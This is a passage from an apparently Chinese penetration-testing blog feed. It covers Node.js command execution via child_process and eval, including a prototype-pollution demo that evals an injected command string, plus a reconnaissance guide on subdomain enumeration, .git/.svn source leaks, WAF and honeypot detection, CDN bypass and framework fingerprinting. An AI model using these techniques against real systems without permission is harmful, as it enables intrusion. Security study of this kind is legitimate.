class="title function_">log</span>(<span class="string">&#x27;web server open on port 3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">filemanage</span>(<span class="params">dir</span>)&#123;</span><br><span class="line">    fs.<span class="title function_">readdir</span>(dir,<span class="keyword">function</span>(<span class="params">err,files</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">        &#125;</span><br><span class="line">        files.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">file</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">dir</span>(file)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="命令-代码执行"><a href="#命令-代码执行" class="headerlink" title="命令&#x2F;代码执行"></a>命令&#x2F;代码执行</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rce=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">rce.<span class="title function_">exec</span>(<span class="string">&#x27;notepad&#x27;</span>);</span><br><span class="line">rce.<span class="title function_">spawnSync</span>(<span class="string">&#x27;notepad&#x27;</span>);</span><br><span class="line"><span class="comment">// 把字符串当做代码解析</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;console.log(1);&#x27;</span>)</span><br><span class="line"><span class="comment">// 所以我们可以通过代码执行来达到命令执行的目的</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>在CTF中很多，如果攻击者控制并修改了一个对象的模型，__proto__，那么将可以影响所有和这个对象来自同一个类、父祖类的对象，举个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>:<span class="number">1</span>&#125; <span class="comment">// foo是一个简单的javascript对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>) <span class="comment">//此时输出为1</span></span><br><span class="line"></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span> <span class="comment">//修改foo原型</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)  <span class="comment">//由于查找顺序的原因，foo.bar还是1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;  <span class="comment">//创建一个空的zoo对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>) <span class="comment">//此时输出为2，这是一个继承关系</span></span><br></pre></td></tr></table></figure><p>所以接下来就很好理解了，做一个命令执行吧</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>:<span class="number">1</span>&#125; </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>) </span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>) </span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">eval</span>(zoo.<span class="property">bar</span>))</span><br></pre></td></tr></table></figure><h2 id="WebPack"><a href="#WebPack" class="headerlink" title="WebPack"></a>WebPack</h2><p>打包器，设想一个场景，当你需要加载很多js文件的时候，文件里面又有好多函数，比如1.js里面定位了函数，2.js里面调用了这个函数，所以你要先加载1.js再加载2.js，就会比较麻烦，所以可以用webpack都写在一个文件如main.js里面</p><p>具体用法可以参考： <a href="https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA">https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA</a></p><p>安装方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i webpack webpack-cli</span><br></pre></td></tr></table></figure><p>webpack有五个核心概念：</p><ol><li>【入口(entry)】：指示 webpack 应该使用哪个模块，来作为构建其内部依赖图的开始。</li><li>【输出(output)】：在哪里输出文件，以及如何命名这些文件。</li><li>【Loader】：处理那些非JavaScript文件（webpack 自身只能解析 JavaScript和json）。webpack 本身只能处理JS、JSON模块，如果要加载其他类型的文件(模块)，就需要使用对应的loader。</li><li>【插件(plugins)】：执行范围更广的任务，从打包到优化都可以实现。</li><li>【模式(mode)】：有生产模式production和开发模式development。</li></ol><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>在根目录新建webpack.config.js，之后就一直使用 webpack命令来执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path= <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>); <span class="comment">//node内置核心模块，用来设置路径。</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">       <span class="attr">mode</span>: <span class="string">&#x27;development&#x27;</span>,   <span class="comment">//开发、生产环境(二选一)，mode: &#x27;production&#x27;</span></span><br><span class="line">       <span class="attr">entry</span>: <span class="string">&#x27;./src/main.js&#x27;</span>, <span class="comment">// 入口文件配置（精简写法）</span></span><br><span class="line">    <span class="comment">/*完整写法：</span></span><br><span class="line"><span class="comment">  entry:&#123;</span></span><br><span class="line"><span class="comment">   main:&#x27;./src/js/app.js&#x27;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">    <span class="attr">output</span>: &#123; <span class="comment">//输出配置</span></span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&#x27;app.js&#x27;</span>,<span class="comment">//输出文件名</span></span><br><span class="line">        <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;build&#x27;</span>) <span class="comment">//输出文件路径(绝对路径)，__dirname表示该文件当前文件夹</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>配置好之后，可以直接在控制台运行 <strong>npx webpack</strong> 来打包</p><h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><p>在开发模式下，所有的代码都可以看到；当使用生产模式时，就只能看到打包后定义的输出文件且内容很少</p><p>工具： <a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p><h3 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h3><p>是一个快速、简洁的JavaScript框架，提供一个简便的设计模式，优化HTML文档操作等</p><p>具体用法啥的在前面JS原生类的库开发已经写过了</p><p>低版本的jQuery爆出过一些漏洞，xss居多，比如CVE-2020-11022和CVE-2020-11023</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;此篇主要写一些开发方面的内容，毕竟不懂代码不会开发只能做一个脚本小子&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;PHP原生类&quot;&gt;&lt;a href=&quot;#PHP原生类&quot; class=&quot;headerlink&quot; title=&quot;PHP原生类&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="WEB" scheme="https://ink-scholar.github.io/tags/WEB/"/>
    
    <category term="开发" scheme="https://ink-scholar.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--信息搜集</title>
    <link href="https://ink-scholar.github.io/2024/01/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>https://ink-scholar.github.io/2024/01/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2024-01-02T15:55:32.430Z</published>
    <updated>2024-01-21T13:40:09.720Z</updated>
    
    <content type="html"><![CDATA[<p><em>大部分就是利用一些在线的威胁情报网站，很多技巧都集合在一些工具里，一般几乎都是傻瓜式的操作</em></p><h1 id="业务资产"><a href="#业务资产" class="headerlink" title="业务资产"></a>业务资产</h1><h2 id="企业信息"><a href="#企业信息" class="headerlink" title="企业信息"></a>企业信息</h2><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>小蓝本</td><td><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></td></tr><tr><td>企查查</td><td><a href="https://www.qcc.com/">https://www.qcc.com</a></td></tr><tr><td>国外企查</td><td><a href="https://opencorporates.com/">https://opencorporates.com</a></td></tr><tr><td>爱企查</td><td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td></tr></tbody></table><p> 以上的查询其实就是输入一个公司名，然后会得到和企业相关的结果，如果网站收费，可以去咸鱼拼多多等地方买会员</p><p>关注点除了域名之外，还有APP和微信公众号等</p><p>根据以上查询的结果归结为以下五种应用，然后对每一种应用类型进行更加细致的信息搜集</p><h1 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h1><h2 id="web单域名"><a href="#web单域名" class="headerlink" title="web单域名"></a>web单域名</h2><h3 id="通过备案信息获取"><a href="#通过备案信息获取" class="headerlink" title="通过备案信息获取"></a>通过备案信息获取</h3><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>备案信息查询</td><td><a href="http://www.beianx.cn/">http://www.beianx.cn/</a></td></tr><tr><td>备案管理系统</td><td><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></td></tr></tbody></table><p>先输入公司名称，然后根据列出的备案号，重新输入备案号 “-” 前的部分，继续查询</p><h3 id="通过企业产权获取"><a href="#通过企业产权获取" class="headerlink" title="通过企业产权获取"></a>通过企业产权获取</h3><p>和企业信息查询方式一致</p><h3 id="通过注册域名获取"><a href="#通过注册域名获取" class="headerlink" title="通过注册域名获取"></a>通过注册域名获取</h3><p>通过域名注册的网站查询，比如在腾讯云，输入之前获取到的域名信息，看看哪些域名被注册了，当然这只是个思路，并不能保证准确性，当然也很可能，这个公司注册了，但是并未投入使用，如果有业务在上面的话，就有扩展了攻击面</p><h3 id="通过反查解析获取"><a href="#通过反查解析获取" class="headerlink" title="通过反查解析获取"></a>通过反查解析获取</h3><p>通过IP地址反查</p><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>微步在线</td><td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>在线同IP网站查询工具</td><td><a href="http://dns.bugscaner.com/">http://dns.bugscaner.com/</a></td></tr></tbody></table><h2 id="web子域名"><a href="#web子域名" class="headerlink" title="web子域名"></a>web子域名</h2><h3 id="DNS数据"><a href="#DNS数据" class="headerlink" title="DNS数据"></a>DNS数据</h3><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>dnsdumpster</td><td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td></tr></tbody></table><h3 id="证书查询"><a href="#证书查询" class="headerlink" title="证书查询"></a>证书查询</h3><p>https的站点可以直接看到证书，通过证书匹配子域名，通过以下网站或者网络空间搜索引擎cert语法</p><table><thead><tr><th>名称</th><th align="left">地址</th></tr></thead><tbody><tr><td>CertificateSearch</td><td align="left"><a href="https://crt.sh/">https://crt.sh/</a></td></tr></tbody></table><h3 id="网络空间"><a href="#网络空间" class="headerlink" title="网络空间"></a>网络空间</h3><p>根据子域名查询语法查询，比如fofa的domain&#x3D;””</p><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>FOFA</td><td><a href="https://fofa.info/">https://fofa.info/</a></td></tr><tr><td>全球鹰</td><td><a href="http://hunter.qianxin.com/">http://hunter.qianxin.com/</a></td></tr><tr><td>360</td><td><a href="https://quake.360.cn/quake/">https://quake.360.cn/quake/</a></td></tr><tr><td>零零信安（只能国内）</td><td><a href="https://0.zone/">https://0.zone/</a></td></tr><tr><td>Shodan（国外）</td><td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td></tr><tr><td>Censys（国外）</td><td><a href="https://censys.io/">https://censys.io/</a></td></tr></tbody></table><h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>微步在线</td><td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>奇安信威胁情报中心</td><td><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></td></tr><tr><td>360威胁情报中心</td><td><a href="https://ti.360.cn/#/homepage">Https://ti.360.cn/#/homepage</a></td></tr></tbody></table><h3 id="枚举解析"><a href="#枚举解析" class="headerlink" title="枚举解析"></a>枚举解析</h3><p>可以通过在线平台的接口查（不推荐）</p><p>工具推荐oneforall，把上述的方法查不多做了一个结合，通过api接口调用，不过现在这个工具也存在各种各样的问题，可以自己对代码进行一下魔改</p><h2 id="web架构"><a href="#web架构" class="headerlink" title="web架构"></a>web架构</h2><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>TideFinger潮汐指纹</td><td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td></tr><tr><td>云悉指纹</td><td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td></tr><tr><td>Wapplayzer</td><td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td></tr></tbody></table><p>当然，有时候很容易会出现误报，需要自己甄别</p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="gotoscan"><a href="#gotoscan" class="headerlink" title="gotoscan"></a>gotoscan</h5><p>适合在不出网环境中使用 </p><h3 id="源码获取"><a href="#源码获取" class="headerlink" title="源码获取"></a>源码获取</h3><h4 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h4><p>直接搜索获取，然后对比一下网站访问情况来确定是否正确</p><h4 id="闭源"><a href="#闭源" class="headerlink" title="闭源"></a>闭源</h4><p>源码不能直接获取是很正常的情况，可以看网站是否存在一些配置不当问题造成的源码泄漏</p><p>以下五种是比较常见的情况</p><h5 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title="git源码泄漏"></a>git源码泄漏</h5><p>在执行 git init 初始化目录时，会在当前目录下自动创建一个 .git 目录，用来记录代码的变更记录等。发布代码时，如果没有把 .git 目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码，可以在网站后加上 .git&#x2F; 看看目录是否存在</p><p>通过工具：<strong>GitHack</strong> 来实现（ <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a> ）</p><h5 id="svn源码泄漏"><a href="#svn源码泄漏" class="headerlink" title="svn源码泄漏"></a>svn源码泄漏</h5><p>原理上和git泄漏差不多，判断方式直接在网站后面加上 .&#x2F;svn&#x2F; 看看是否存在即可</p><p>通过工具：<strong>SvnHack-master</strong> 来实现</p><p>使用时 -u 指定url时，格式为 url&#x2F;.svn&#x2F;entries ，后面加上 – download 即可下载</p><h5 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h5><p>可以通过目录扫描工具进行尝试 </p><h5 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title="DS_Store文件泄漏"></a>DS_Store文件泄漏</h5><p>是Mac下Finder用来保存如何展示文件或文件夹的数据文件，每个文件夹下对应一个，如果将它上传至服务器，可能造成目录结构泄漏</p><p>通过工具：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a> 来实现</p><h5 id="composer-json"><a href="#composer-json" class="headerlink" title="composer.json"></a>composer.json</h5><p>类似于版权文件的介绍，php中使用</p><h4 id="其他方向"><a href="#其他方向" class="headerlink" title="其他方向"></a>其他方向</h4><h5 id="识别出大致信息却无法下载"><a href="#识别出大致信息却无法下载" class="headerlink" title="识别出大致信息却无法下载"></a>识别出大致信息却无法下载</h5><p>访问网站，查看加载文件，选取一些看着比较有特点的脚本文件、js文件等，然后去github等网站去搜索这个文件，查看结果 </p><h5 id="未识别出信息使用码云资源获取"><a href="#未识别出信息使用码云资源获取" class="headerlink" title="未识别出信息使用码云资源获取"></a>未识别出信息使用码云资源获取</h5><p>有时通过工具扫描，可以扫出一些特征信息，比如开发者的邮箱，可以通过github等平台去尝试搜索</p><h5 id="其他行业开发使用对口资源站获取"><a href="#其他行业开发使用对口资源站获取" class="headerlink" title="其他行业开发使用对口资源站获取"></a>其他行业开发使用对口资源站获取</h5><p>比如互站网</p><h2 id="JS前端架构"><a href="#JS前端架构" class="headerlink" title="JS前端架构"></a>JS前端架构</h2><h3 id="什么是JS渗透测试"><a href="#什么是JS渗透测试" class="headerlink" title="什么是JS渗透测试"></a>什么是JS渗透测试</h3><p>在javascript中也存在变量和函数，我们可以通过浏览器查看源代码获取真实的点，获取url、敏感信息。一般会在JS中寻找更多的URL地址，JS代码逻辑（加密算法、APIkey，验证逻辑）</p><h3 id="JS安全问题"><a href="#JS安全问题" class="headerlink" title="JS安全问题"></a>JS安全问题</h3><p>源码泄漏、未授权访问、敏感key泄漏、API接口安全</p><h3 id="流行的JS框架"><a href="#流行的JS框架" class="headerlink" title="流行的JS框架"></a>流行的JS框架</h3><p>Vue、NodeJS、JQuery、Angular</p><h3 id="手动分析"><a href="#手动分析" class="headerlink" title="手动分析"></a>手动分析</h3><p>当确定为js框架后，访问页面刷新，F12查看加载的JS文件，寻找名字有意义的js文件，如login.js</p><p>也可以直接搜索，搜索内容可以是如下：</p><p>src&#x3D;，path&#x3D;，method:”get”，http.get(“，method:”post”，http.post(“，$.ajax，service.httppost，service.httpget</p><p>大部分地址的代码需要追踪分析</p><h3 id="半自动分析"><a href="#半自动分析" class="headerlink" title="半自动分析"></a>半自动分析</h3><p>结合burp，访问，在Target–Site map中找到网站地址，右键，Engagement tools–Find scripts，即可</p><p>可以用burp官方插件，JS Link Finder和JS Miner</p><p>也可以用第三方的，推荐HaE（知道创宇404开发）（ <a href="https://github.com/gh0stkey/HaE">https://github.com/gh0stkey/HaE</a> ） ， Unexpected_information（ <a href="https://github.com/ScriptKid-Beta/Unexpected_information">https://github.com/ScriptKid-Beta/Unexpected_information</a> ）</p><h3 id="全自动"><a href="#全自动" class="headerlink" title="全自动"></a>全自动</h3><p>浏览器插件：findsomething（一个熊猫头）</p><p>脚本工具：JSFinder（不推荐用），URLFinder（jsfinder升级版，更好用一点）（ <a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a> ）</p><p>但是有些js文件我们并不能直接在前端分析出路径，比如登陆后加载的js文件，这时候我们需要Fuzz一下，推荐工具 <strong>ffuf</strong> ，使用这个工具需要fuzz字典，字典下载地址：<a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io</a></p><p>另一个是针对Webpack等前端打包工具所构造的网站进行一个扫描，<strong>Packer-Fuzzer</strong> ，大部分前端都会用到Webpack</p><h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><h3 id="Web服务器"><a href="#Web服务器" class="headerlink" title="Web服务器"></a>Web服务器</h3><p>判断方法有很多，比如从响应头的Server信息，Apache、Nginx、IIS、lighttpd，Web服务器主要用于提供静态内容，如HTML、CSS和JavaScript等，以及处理对这些内容的HTTP请求。Web服务器通常使用HTTP协议来与客户端通信，以便在浏览器中呈现网页。</p><h3 id="应用服务器"><a href="#应用服务器" class="headerlink" title="应用服务器"></a>应用服务器</h3><p>Tomcat、Jboss、Weblogic、Websphere，相比于web服务器，他们的特点是有特定端口服务的开放，所以应用服务器的探测要用到端口扫描，通过Server信息一般很难看到，应用服务器主要用于提供动态内容，如数据库查询和Web应用程序逻辑等，通常与Web服务器协同工作。应用服务器通常使用专有协议与客户端通信，以便执行更复杂的操作和提供更高级的功能。</p><p>扫描工具：nmap、masscan</p><p>被动扫描：利用网络空间搜索引擎。fofa等</p><p>端口扫描还可以扫其他的服务，比如数据库mysql、sqlserver、oracle、redis、mongodb，操作系统linux、windows等</p><p>有一种现象需要注意，比如一个web搭在了内网，然后把web端口转到了外网，这时你只能扫外网ip，你可以扫到web服务，但是如果内网中开启了比如mysql且没有转到外网，这样你是扫不到的，但是web本身用到了mysql，这是一种现象</p><h2 id="Waf识别"><a href="#Waf识别" class="headerlink" title="Waf识别"></a>Waf识别</h2><p>web应用防火墙，云waf、硬件waf、软件waf、代码级waf这些，识别的话可以看一下他们的拦截页面，identywaf项目内置了一些拦截页面，当然也可以使用自动的工具。推荐工具 <strong>wafw00f</strong> ， <strong>identYwaf</strong>。除此之外，还可以使用fofa等直接查域名即可</p><h2 id="蜜罐识别"><a href="#蜜罐识别" class="headerlink" title="蜜罐识别"></a>蜜罐识别</h2><p>是一种安全威胁的检测技术，本质在于引诱和欺骗攻击者，并通过记录攻击者的攻击日志来产生价值</p><p>根据蜜罐与攻击者之间进行的交互程度，分为低、中、高交互蜜罐</p><p>识别工具：360quake（ <a href="https://github.com/360quake/quake_rs">https://github.com/360quake/quake_rs</a> ） ， 当然，也是用网络空间搜索引擎来识别的</p><p>一般情况下，使用web去访问一些蜜罐端口会出现下载的情况，比如蜜罐开启了mysql应用，然后我们去爆破它，蜜罐就会记录攻击者的账号密码，账号密码会采用web jsonp去传输，当你http协议访问，就会被下载，说到底蜜罐这些功能服务还是使用web功能来实现的</p><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>加速域名（子域名获取真实IP）、加速区域（全球ping）、加速类型（证书）</p><p>当然以上方法和配置有关</p><h3 id="判断是否存在"><a href="#判断是否存在" class="headerlink" title="判断是否存在"></a>判断是否存在</h3><p>多地区ping，看一下IP是否相同，若不同，则使用了CDN，使用网站：17ce.com、ping.chinaz.com</p><p>如果你怀疑某个ip是否是这个域名的真实ip，可以将这个ip和域名写入hosts文件，然后访问域名，若成功，则是</p><h3 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h3><h4 id="主动寻找-遗留文件"><a href="#主动寻找-遗留文件" class="headerlink" title="主动寻找&amp;遗留文件"></a>主动寻找&amp;遗留文件</h4><p>除了上诉这些子域名等方法，还可以尝试一些主动漏洞或者遗留文件，如ssrf，让站点来主动访问我们，可以用dnslog平台来记录站点的ip，当然如果网站存在像远程加载图片这种功能，同样可以利用这种方法，让网站主动来访问我们，然后记录下ip地址；遗留文件如phpinfo这种配置文件，也可能会</p><h4 id="邮件系统"><a href="#邮件系统" class="headerlink" title="邮件系统"></a>邮件系统</h4><p>有两种情况，第一种就是邮件系统做不了CDN，因为邮件系统记录类型通常为MX，这种记录类型一般无法设置CDN</p><p>第二种情况其实也是主动寻找，就是它主动给我发邮件，然后查看显示邮件原文即可看到真实ip</p><p>常见的邮件触发点有：RSS订阅、邮箱注册激活、找回密码、邮件推送、邮件通知等</p><p>不过在收到邮件时要先看一下发件人，是否是使用了他们自己的邮件服务器，因为有可能是代发，使用如126这种其他的邮箱代发</p><p>还有一种骚操作：首先你自己用vps搞个邮箱服务器，然后你发送邮件到一个不存在的邮箱地址，因为该用户不存在，所以发送失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实IP通知，不过如果对方设置了一些策略，比如任何邮件地址都可以投递成功这种，这种方法就失效</p><p>这里必须用自己的邮件服务器，如果你用比如QQ邮箱去发送，这样投递失败的话，错误信息会先发给QQ，然后QQ在发给我，这样得到的ip其实是QQ的</p><h4 id="在线网站接口查询"><a href="#在线网站接口查询" class="headerlink" title="在线网站接口查询"></a>在线网站接口查询</h4><p><a href="https://get-site-ip.com/">https://get-site-ip.com/</a>  国外接口，输入域名直接返回真实ip，不过效果的话就要看运气了</p><p> <a href="https://fofa.info/extensions/source">https://fofa.info/extensions/source</a>  fofa可以查，不过要花钱，如果查国外的话，效果还不错，但是如果查国内站点，效果属实一般甚至没啥效果（法律风险）</p><h4 id="全网扫描"><a href="#全网扫描" class="headerlink" title="全网扫描"></a>全网扫描</h4><p>一般步骤为判断加速厂商（ <a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a> ） ， IP库筛地址段（ <a href="https://cz88.net/geo-public">https://cz88.net/geo-public</a> ） ， 配置范围扫描（工具 fuckcdn）</p><p>就是先判断厂商，比如是阿里云，然后再去库里面筛选阿里云的ip地址段，然后将这些ip段加入到工具里，再把网站的关键词加到工具里，然后开扫</p><p>这个工具会先从ip段扫描符合开放的端口，再去页面找之前设置的关键字，然后返回结果，不过如果站点不支持ip访问，那就不行了</p><p>这时候换另一个工具： Bypass_cdn</p><h2 id="框架组件"><a href="#框架组件" class="headerlink" title="框架组件"></a>框架组件</h2><h3 id="Python开发框架"><a href="#Python开发框架" class="headerlink" title="Python开发框架"></a>Python开发框架</h3><h4 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h4><p>可以用插件识别，数据包中一般存在Set-Cookie:csrftoken&#x3D;</p><h4 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h4><p>插件识别，数据包中一般会出现flask</p><h3 id="PHP开发框架"><a href="#PHP开发框架" class="headerlink" title="PHP开发框架"></a>PHP开发框架</h3><h4 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h4><p>插件识别，数据包中带有ThinkPHP，网站的图标识别，还有很多是用thinkPHP二次开发</p><h4 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h4><p>插件识别，数据包特征</p><h4 id="Yii"><a href="#Yii" class="headerlink" title="Yii"></a>Yii</h4><p>插件识别，数据包特征</p><h3 id="JAVA组件"><a href="#JAVA组件" class="headerlink" title="JAVA组件"></a>JAVA组件</h3><p>52类110个主流的JAVA组件</p><p><a href="https://blog.csdn.net/agonie201218/article/details/125300729">https://blog.csdn.net/agonie201218/article/details/125300729</a></p><h4 id="Fastjson-Jackson"><a href="#Fastjson-Jackson" class="headerlink" title="Fastjson&#x2F;Jackson"></a>Fastjson&#x2F;Jackson</h4><p>Fastjson可以将Java对象和json格式字符串之间相互转换</p><p>在提交json数据包中修改测试，Fastjson组件会把01解析成1，Jackson组件在解析01时会抛出异常</p><p><a href="https://forum.butian.net/share/1679">https://forum.butian.net/share/1679</a></p><h4 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h4><p>执行身份验证、授权、密码和会话管理</p><p>请求包的cookie中存在rememberMe字段，返回包中存在set-Cookie: rememberMe&#x3D;deleteMe。请求包中存在rememberMe&#x3D;x时，响应包中存在rememberMe&#x3D;deleteMe。有时候服务器不会主动返回rememberMe&#x3D;deleteMe，直接发包即可，将Cookie内容改为rememberMe&#x3D;1，若响应包有rememberMe&#x3D;deleteMe，则基本可以确定网站是apache shiro搭建的</p><h4 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h4><p>一般使用此框架后缀带do或action，可以尝试进行利用</p><h4 id="Springboot"><a href="#Springboot" class="headerlink" title="Springboot"></a>Springboot</h4><p>默认报错页面</p><p><img src="/2024/01/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20240120162917489.png" alt="image-20240120162917489"></p><p>还有他的默认图标，一个绿色的叶子，icon_hash&#x3D;116323821</p><h4 id="Solar"><a href="#Solar" class="headerlink" title="Solar"></a>Solar</h4><p>一般开放8983端口</p><h1 id="APP应用"><a href="#APP应用" class="headerlink" title="APP应用"></a>APP应用</h1><h2 id="获取APP"><a href="#获取APP" class="headerlink" title="获取APP"></a>获取APP</h2><h3 id="名称获取"><a href="#名称获取" class="headerlink" title="名称获取"></a>名称获取</h3><p>1、爱企查–知识产权</p><p>2、七麦( <a href="https://qimai.cn/">https://qimai.cn</a> )、点点( <a href="https://app.diandian.com/">https://app.diandian.com</a> )、小蓝本、豌豆荚查名称</p><h3 id="URL网站备案获取"><a href="#URL网站备案获取" class="headerlink" 